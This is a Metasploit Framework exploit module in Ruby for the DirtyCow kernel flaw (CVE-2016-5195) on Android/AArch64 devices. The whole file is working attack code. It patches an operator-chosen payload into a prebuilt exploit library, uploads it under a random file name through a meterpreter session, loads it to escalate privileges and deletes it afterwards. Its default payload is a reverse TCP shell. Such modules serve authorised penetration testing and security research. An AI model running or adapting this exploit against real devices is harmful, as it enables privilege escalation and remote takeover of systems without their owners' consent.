##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info, {
        'Name'          => "Android DirtyCow Exploit",
        'Description'   => %q{
          A race condition was found in the way the Linux kernel's memory
          subsystem handled the copy-on-write (COW) breakage of private
          read-only memory mappings. An unprivileged local user could use
          this flaw to gain write access to otherwise read-only memory mappings
          and thus increase their privileges on the system.
          The bug has existed since around Linux Kernel 2.6.22 (released in 2007).
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'Phil Oester',  # discovery
          'scumjr',       # dirtycow-mem.c
          'timwr',        # metasploit module
        ],
        'References'    =>
        [
          [ 'CVE', '2016-5195' ],
          [ 'URL', 'http://dirtycow.ninja/' ],
          [ 'URL', 'https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2' ],
        ],
        'DisclosureDate' => "Oct 20 2016",
        'SessionTypes'   => [ 'meterpreter' ],
        "Platform"       => [ "android", "linux" ],
        "Arch"           => ARCH_AARCH64,
        'Payload'        => { 'Space'    => 2048, },
        'DefaultOptions' =>
        {
          'PAYLOAD'      => 'generic/shell_reverse_tcp',
          'WfsDelay'     => 300,
        },
        'DefaultTarget' => 0,
        'Targets'       => [ ['Automatic', { }]],
    }))
  end

  def exploit
    local_file = File.join( Msf::Config.data_directory, "exploits", "CVE-2016-5195.so" )
    exploit_data = File.read(local_file, {:mode => 'rb'})

    # Substitute the exploit shellcode with our own
    space = payload_space
    payload_encoded = payload.encoded
    exploit_data.gsub!("\x90" * 4 + "\x00" * (space - 4), payload_encoded + "\x90" * (payload_encoded.length - space))

    workingdir = session.fs.dir.getwd
    remote_file = "#{workingdir}/#{Rex::Text::rand_text_alpha_lower(5)}"
    write_file(remote_file, exploit_data)

    print_status("Loading exploit library #{remote_file}")
    session.core.load_library(
        'LibraryFilePath' => local_file,
        'TargetFilePath'  => remote_file,
        'UploadLibrary'   => false,
        'Extension'       => false,
        'SaveToDisk'      => false
    )
    print_status("Loaded library #{remote_file}, deleting")
    session.fs.file.rm(remote_file)
    print_status("Waiting #{datastore['WfsDelay']} seconds for payload")
  end
end

